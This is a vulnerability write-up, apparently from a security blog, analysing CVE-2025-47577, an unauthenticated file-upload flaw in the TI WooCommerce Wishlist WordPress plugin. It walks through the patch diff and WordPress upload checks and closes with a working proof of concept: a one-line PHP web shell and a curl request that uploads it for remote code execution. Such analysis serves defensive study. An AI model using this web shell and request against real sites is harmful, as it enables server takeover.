---
title: CVE-2025-47577 Analysis & POC
description: Security Vulnerability in WordPress TI WooCommerce Wishlist Plugin.
date: 2025-11-07 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, arbitrary file upload]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

The **"Unrestricted Upload of File with Dangerous Type"** vulnerability in **TemplateInvaders TI WooCommerce Wishlist** allows uploading a **Web Shell** to the web server. This issue affects **TI WooCommerce Wishlist**: from **n/a** to **before 2.10.0**.

* **CVE ID**: [CVE-2025-47577](https://www.cve.org/CVERecord?id=CVE-2025-47577)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 2.9.2
* **Patched Versions**: 2.10.0
* **CVSS severity**: High (10)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress TI WooCommerce Wishlist Plugin](https://wordpress.org/plugins/ti-woocommerce-wishlist/)

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **TI WooCommerce Wishlist**: **2.9.2** (vulnerable) and **2.10.0** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) or any diff tool to check and compare differences between versions.
* [**WooCommerce**](https://wordpress.org/plugins/woocommerce/)
* [**WC Fields Factory**](https://wordpress.org/plugins/wc-fields-factory/)

## Analysis

### Patch Diff

```php {title="wc-fields-factory.php - v2.9.2" hl_lines=[9] data-open=true}
function tinvwl_upload_file_wc_fields_factory( $file ) {
	if ( ! function_exists( 'wp_handle_upload' ) ) {
		require_once( ABSPATH . 'wp-admin/includes/file.php' );
	}
	$upload = wp_handle_upload(
		$file,
		[
			'test_form' => false,
			'test_type' => false,
		]
	);

	return $upload;
}
```

In the vulnerable version, the function `tinvwl_upload_file_wc_fields_factory()` calls `wp_handle_upload()` to upload files into WordPress's official uploads directory (`wp-content/uploads/<year>/<month>/`).

> [!BUG]
> However, the option `test_type => false` causes WordPress to **skip MIME Type checking** against its allowed whitelist.
> This allows an attacker to **upload dangerous files such as a `.php` web shell** to the server.

```php {title="wc-fields-factory.php - v2.10.0" hl_lines=[] data-open=true}
function tinvwl_upload_file_wc_fields_factory( $file ) {
	if ( ! function_exists( 'wp_handle_upload' ) ) {
		require_once( ABSPATH . 'wp-admin/includes/file.php' );
	}
	$upload = wp_handle_upload(
		$file,
		[
			'test_form' => false,
		]
	);

	return $upload;
}
```

The patch removes the `'test_type' => false` option, so by default `'test_type' => true` is used, enabling MIME checks against the whitelist and preventing uploads of dangerous files like `.php` web shells.

### Vulnerable Code

> [!QUESTION]
> Before tracing further, I want to inspect `wp_handle_upload()` to answer two questions:
>
> * Why does removing `'test_type' => false` enable MIME whitelist checks?
> * What does that whitelist include?

[wp_handle_upload()](https://developer.wordpress.org/reference/functions/wp_handle_upload/) is a wrapper for [_wp_handle_upload()](https://developer.wordpress.org/reference/functions/wp_handle_upload/)

```php {title="wordpress/wp-admin/includes/file.php" hl_lines=[11] data-open=true}
function wp_handle_upload( &$file, $overrides = false, $time = null ) {
	/*
	 *  $_POST['action'] must be set and its value must equal $overrides['action']
	 *  or this:
	 */
	$action = 'wp_handle_upload';
	if ( isset( $overrides['action'] ) ) {
		$action = $overrides['action'];
	}

	return _wp_handle_upload( $file, $overrides, $time, $action );
}
```

`wp_handle_upload()` sets `$action` and calls `_wp_handle_upload()`.

In the file containing `_wp_handle_upload()`, line [915](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L915)

```php {title="wordpress/wp-admin/includes/file.php" data-open=true}
$test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true;
```

ðŸ‘‰ This assigns the value to `$test_type` â€” if `$overrides` contains the `'test_type'` key, its value is used; otherwise the default is `true`.

So when we don't pass `test_type` or pass `test_type => true`, `$test_type` is `true`.

At lines [953-973](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L953-L973)

```php {title="wordpress/wp-admin/includes/file.php" hl_lines=[2,12,13,14] data-open=true}
if ( $test_type ) {
    $wp_filetype     = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes );
    $ext             = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext'];
    $type            = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type'];
    $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename'];

    // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect.
    if ( $proper_filename ) {
        $file['name'] = $proper_filename;
    }

    if ( ( ! $type || ! $ext ) && ! current_user_can( 'unfiltered_upload' ) ) {
        return call_user_func_array( $upload_error_handler, array( &$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) );
    }

    if ( ! $type ) {
        $type = $file['type'];
    }
} else {
    $type = '';
}
```

If `$test_type = true`, the function calls `wp_check_filetype_and_ext()` to validate the file extension and MIME type based on WordPress's allowed whitelist. If the file lacks an allowed extension or MIME type, and the user does not have the `unfiltered_upload` capability, the upload is **rejected**.

[Lines 3089-3315](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3089-L3315)

```php {title="wordpress/wp-includes/functions.php" hl_lines=[5] data-open=true}
function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {
	$proper_filename = false;

	// Do basic extension validation and MIME mapping.
	$wp_filetype = wp_check_filetype( $filename, $mimes );
    ...
    // Validate image types.
    // Validate files that didn't get validated during previous checks.
    // The mime type must be allowed.
    ...
}
```

`wp_check_filetype_and_ext()` calls `wp_check_filetype()` to perform basic extension validation and MIME mapping.

[Line 3045-3062](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3045-L3062)

```php {title="wordpress/wp-includes/functions.php" hl_lines=[3] data-open=true}
function wp_check_filetype( $filename, $mimes = null ) {
	if ( empty( $mimes ) ) {
		$mimes = get_allowed_mime_types();
	}
	$type = false;
	$ext  = false;

	foreach ( $mimes as $ext_preg => $mime_match ) {
		$ext_preg = '!\.(' . $ext_preg . ')$!i';
		if ( preg_match( $ext_preg, $filename, $ext_matches ) ) {
			$type = $mime_match;
			$ext  = $ext_matches[1];
			break;
		}
	}

	return compact( 'ext', 'type' );
}
```

`wp_check_filetype()` only checks the file extension against WordPress's MIME whitelist â€” it does not verify the actual file content.

The function calls `get_allowed_mime_types()` to retrieve the list of allowed MIME types.

[Line 3640-3661](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3640-L3661)

```php {title="wordpress/wp-includes/functions.php" hl_lines=[2] data-open=true}
function get_allowed_mime_types( $user = null ) {
	$t = wp_get_mime_types();

	unset( $t['swf'], $t['exe'] );
	if ( function_exists( 'current_user_can' ) ) {
		$unfiltered = $user ? user_can( $user, 'unfiltered_html' ) : current_user_can( 'unfiltered_html' );
	}

	if ( empty( $unfiltered ) ) {
		unset( $t['htm|html'], $t['js'] );
	}

	/**
	 * Filters the list of allowed mime types and file extensions.
	 *
	 * @since 2.0.0
	 *
	 * @param array            $t    Mime types keyed by the file extension regex corresponding to those types.
	 * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user).
	 */
	return apply_filters( 'upload_mimes', $t, $user );
}
```

`wp_get_mime_types()` returns the actual list of accepted MIME types.

[Line 3430-3557](https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3430-L3557)

```php {title="wordpress/wp-includes/functions.php" hl_lines=[]}
function wp_get_mime_types() {
	/**
	 * Filters the list of mime types and file extensions.
	 *
	 * This filter should be used to add, not remove, mime types. To remove
	 * mime types, use the 'upload_mimes' filter.
	 *
	 * @since 3.5.0
	 *
	 * @param string[] $wp_get_mime_types Mime types keyed by the file extension regex
	 *                                    corresponding to those types.
	 */
	return apply_filters(
		'mime_types',
		array(
			// Image formats.
			'jpg|jpeg|jpe'                 => 'image/jpeg',
			'gif'                          => 'image/gif',
			'png'                          => 'image/png',
			'bmp'                          => 'image/bmp',
			'tiff|tif'                     => 'image/tiff',
			'webp'                         => 'image/webp',
			'avif'                         => 'image/avif',
			'ico'                          => 'image/x-icon',

			// TODO: Needs improvement. All images with the following mime types seem to have .heic file extension.
			'heic'                         => 'image/heic',
			'heif'                         => 'image/heif',
			'heics'                        => 'image/heic-sequence',
			'heifs'                        => 'image/heif-sequence',

			// Video formats.
			'asf|asx'                      => 'video/x-ms-asf',
			'wmv'                          => 'video/x-ms-wmv',
			'wmx'                          => 'video/x-ms-wmx',
			'wm'                           => 'video/x-ms-wm',
			'avi'                          => 'video/avi',
			'divx'                         => 'video/divx',
			'flv'                          => 'video/x-flv',
			'mov|qt'                       => 'video/quicktime',
			'mpeg|mpg|mpe'                 => 'video/mpeg',
			'mp4|m4v'                      => 'video/mp4',
			'ogv'                          => 'video/ogg',
			'webm'                         => 'video/webm',
			'mkv'                          => 'video/x-matroska',
			'3gp|3gpp'                     => 'video/3gpp',  // Can also be audio.
			'3g2|3gp2'                     => 'video/3gpp2', // Can also be audio.
			// Text formats.
			'txt|asc|c|cc|h|srt'           => 'text/plain',
			'csv'                          => 'text/csv',
			'tsv'                          => 'text/tab-separated-values',
			'ics'                          => 'text/calendar',
			'rtx'                         => 'text/richtext',
			'css'                          => 'text/css',
			'htm|html'                     => 'text/html',
			'vtt'                          => 'text/vtt',
			'dfxp'                         => 'application/ttaf+xml',
			// Audio formats.
			'mp3|m4a|m4b'                  => 'audio/mpeg',
			'aac'                          => 'audio/aac',
			'ra|ram'                       => 'audio/x-realaudio',
			'wav|x-wav'                    => 'audio/wav',
			'ogg|oga'                      => 'audio/ogg',
			'flac'                         => 'audio/flac',
			'mid|midi'                     => 'audio/midi',
			'wma'                          => 'audio/x-ms-wma',
			'wax'                          => 'audio/x-ms-wax',
			'mka'                          => 'audio/x-matroska',
			// Misc application formats.
			'rtf'                          => 'application/rtf',
			'js'                           => 'application/javascript',
			'pdf'                          => 'application/pdf',
			'swf'                          => 'application/x-shockwave-flash',
			'class'                        => 'application/java',
			'tar'                          => 'application/x-tar',
			'zip'                          => 'application/zip',
			'gz|gzip'                      => 'application/x-gzip',
			'rar'                          => 'application/rar',
			'7z'                           => 'application/x-7z-compressed',
			'exe'                          => 'application/x-msdownload',
			'psd'                          => 'application/octet-stream',
			'xcf'                          => 'application/octet-stream',
			// MS Office formats.
			'doc'                          => 'application/msword',
			'pot|pps|ppt'                  => 'application/vnd.ms-powerpoint',
			'wri'                          => 'application/vnd.ms-write',
			'xla|xls|xlt|xlw'              => 'application/vnd.ms-excel',
			'mdb'                          => 'application/vnd.ms-access',
			'mpp'                          => 'application/vnd.ms-project',
			'docx'                         => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
			'docm'                         => 'application/vnd.ms-word.document.macroEnabled.12',
			'dotx'                         => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template',
			'dotm'                         => 'application/vnd.ms-word.template.macroEnabled.12',
			'xlsx'                         => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
			'xlsm'                         => 'application/vnd.ms-excel.sheet.macroEnabled.12',
			'xlsb'                         => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12',
			'xltx'                         => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template',
			'xltm'                         => 'application/vnd.ms-excel.template.macroEnabled.12',
			'xlam'                         => 'application/vnd.ms-excel.addin.macroEnabled.12',
			'pptx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
			'pptm'                         => 'application/vnd.ms-powerpoint.presentation.macroEnabled.12',
			'ppsx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow',
			'ppsm'                         => 'application/vnd.ms-powerpoint.slideshow.macroEnabled.12',
			'potx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.template',
			'potm'                         => 'application/vnd.ms-powerpoint.template.macroEnabled.12',
			'ppam'                         => 'application/vnd.ms-powerpoint.addin.macroEnabled.12',
			'sldx'                         => 'application/vnd.openxmlformats-officedocument.presentationml.slide',
			'sldm'                         => 'application/vnd.ms-powerpoint.slide.macroEnabled.12',
			'onetoc|onetoc2|onetmp|onepkg' => 'application/onenote',
			'oxps'                         => 'application/oxps',
			'xps'                          => 'application/vnd.ms-xpsdocument',
			// OpenOffice formats.
			'odt'                          => 'application/vnd.oasis.opendocument.text',
			'odp'                          => 'application/vnd.oasis.opendocument.presentation',
			'ods'                          => 'application/vnd.oasis.opendocument.spreadsheet',
			'odg'                          => 'application/vnd.oasis.opendocument.graphics',
			'odc'                          => 'application/vnd.oasis.opendocument.chart',
			'odb'                          => 'application/vnd.oasis.opendocument.database',
			'odf'                          => 'application/vnd.oasis.opendocument.formula',
			// WordPerfect formats.
			'wp|wpd'                       => 'application/wordperfect',
			// iWork formats.
			'key'                          => 'application/vnd.apple.keynote',
			'numbers'                      => 'application/vnd.apple.numbers',
			'pages'                        => 'application/vnd.apple.pages',
		)
	);
}
```

ðŸ‘‰ The answer to question two has been found.

---

The function `tinvwl_upload_file_wc_fields_factory()` is called inside `tinvwl_meta_wc_fields_factory()`.

```php {title="wc-fields-factory.php - v2.9.2" hl_lines=[5] data-open=true}
function tinvwl_meta_wc_fields_factory( $meta, $post, $files ) {
	if ( function_exists( 'wcff' ) ) {
		foreach ( $files as $name => $file ) {
			if ( array_key_exists( $name, $meta ) ) {
				$upload = tinvwl_upload_file_wc_fields_factory( $file );
				if ( empty( $upload['error'] ) && ! empty( $upload['file'] ) ) {
					$file['tmp_name'] = $upload['file'];
					$meta[ $name ]    = json_encode( array_merge( $upload, $file ) );
				}
			}
		}
	}

	return $meta;
}
```

It only runs if the **WC Fields Factory (wcff)** plugin is active â€” because that plugin defines the `wcff()` function (found by searching for `function wcff(` in the plugins directory).

![wcff](wcff.png "Where wcff() is defined")

We see that `wcff()` is defined by the **WC Fields Factory (wcff)** plugin.

```php
if ( array_key_exists( $name, $meta ) ) { ... }
```

It only processes if the file name (`$name`) matches a key in `$meta` (i.e., a valid form field).

```php
$upload = tinvwl_upload_file_wc_fields_factory( $file );
```

Calls `tinvwl_upload_file_wc_fields_factory()` to upload the file to the server.

The function `tinvwl_meta_wc_fields_factory()` is registered as a callback for a filter:

```php
add_filter( 'tinvwl_addtowishlist_prepare_form', 'tinvwl_meta_wc_fields_factory', 10, 3 );
```

Meaning when `apply_filters( 'tinvwl_addtowishlist_prepare_form',...)` is invoked, `tinvwl_meta_wc_fields_factory()` is called.

The `tinvwl_addtowishlist_prepare_form` filter is applied within `add_to_wishlist()`:

```php {title="addtowishlist.class.php - v2.9.2" hl_lines=[33] data-open=true}
function add_to_wishlist() {
    if ( is_null( filter_input( INPUT_POST, 'tinv_wishlist_id' ) ) ) {
        return false;
    } else {
        remove_action( 'init', 'woocommerce_add_to_cart_action' );
        remove_action( 'wp_loaded', 'WC_Form_Handler::add_to_cart_action', 20 );
    }
    ob_start();
    $post = filter_input_array( INPUT_POST, array(
        'tinv_wishlist_id'   => FILTER_VALIDATE_INT,
        'tinv_wishlist_name' => FILTER_SANITIZE_FULL_SPECIAL_CHARS,
        'product_id'         => FILTER_VALIDATE_INT,
        'product_variation'  => FILTER_VALIDATE_INT,
        'product_type'       => FILTER_SANITIZE_FULL_SPECIAL_CHARS,
        'product_action'     => FILTER_SANITIZE_FULL_SPECIAL_CHARS,
        'redirect'           => FILTER_SANITIZE_URL,
    ) );

    $post['original_product_id'] = $post['product_id'];

    $wlp      = null;
    $wishlist = null;
    $data     = array( 'msg' => array() );
    ...

    $status = true;
    if ( empty( $post['product_id'] ) || apply_filters( 'tinvwl_addtowishlist_not_allowed', false, $post ) ) {
        $status        = false;
        $data['msg'][] = __( 'Something went wrong', 'ti-woocommerce-wishlist' );
    } else {
        $post['product_type'] = apply_filters( 'tinvwl_addtowishlist_modify_type', $post['product_type'], $post );
        $post                 = apply_filters( 'tinvwl_addtowishlist_prepare', $post );
        $form                 = apply_filters( 'tinvwl_addtowishlist_prepare_form', filter_input( INPUT_POST, 'form', FILTER_DEFAULT, FILTER_FORCE_ARRAY ), $_POST, $_FILES );
        ...
    } 
    ...
}
```

Conditions required for the filter logic to run:

* The POST request must include the `tinv_wishlist_id` parameter.
* `product_id` must exist and the filter `tinvwl_addtowishlist_not_allowed` must remain `false`.

The filter `tinvwl_addtowishlist_not_allowed` defaults to `false` â€” searching the codebase found no places that alter it.

![Filter](filter.png "tinvwl_addtowishlist_not_allowed remains false")

`add_to_wishlist()` is registered as a callback for an action hook:

```php
add_action( 'wp_loaded', array( $this, 'add_to_wishlist' ), 0 );
```

So `add_to_wishlist` runs on every request.

### Flow

{{< mermaid >}}
graph TD
A["HTTP POST (tinv_wishlist_id, product_id, form[...] + file)"] --> B["wp_loaded â†’ add_to_wishlist()"]
B --> C["apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)"]
C --> D["tinvwl_meta_wc_fields_factory($meta, $post, $files)"]
D --> E["foreach $files as $name => $file"]
E --> F["if array_key_exists($name, $meta)"]
F --> G["tinvwl_upload_file_wc_fields_factory($file)"]
G --> H["wp_handle_upload($file, ['test_form'=>false, 'test_type'=>false])"]
H --> I["_wp_handle_upload() â€” MIME checks skipped"]
I --> J["File written to /wp-content/uploads â†’ possible RCE"]
{{< /mermaid >}}

## Exploit

### Proof of Concept (PoC)

1. Create a `.php` file containing a web shell:

```php
<?php system($_REQUEST["cmd"]) ?>
```

2. Send a POST request:

```bash
curl -X POST "http://localhost" -F "tinv_wishlist_id=1" -F "product_id=1" -F "form[image]=1" -F "image=@rce.php"
```

3. RCE via file upload

![Result](result.png "RCE via file upload")

## Conclusion

The **CVE-2025-47577** vulnerability originates from **disabling MIME type checks (`test_type => false`)** in the `wp_handle_upload()` call, allowing an attacker to upload arbitrary files, including **malicious PHP code**. Once a file is uploaded into `/wp-content/uploads/`, it may be directly accessible and used to execute remote code (RCE). The 2.10.0 patch restores MIME checking, ensuring only file types listed in WordPress's whitelist are allowed for upload.

## Key Takeaway

* Always enforce **MIME type** and **file extension** checks when handling uploads.
* Do not **override WordPress's default security mechanisms** such as `test_type`.
* When analyzing vulnerabilities, **comparing patch diffs** quickly reveals the root cause.
* Plugin developers should regularly **audit hooks and filters related to uploads** to prevent RCE risks.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress TI WooCommerce Wishlist Plugin <= 2.9.2 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/ti-woocommerce-wishlist/vulnerability/wordpress-ti-woocommerce-wishlist-2-9-2-arbitrary-file-upload-vulnerability)
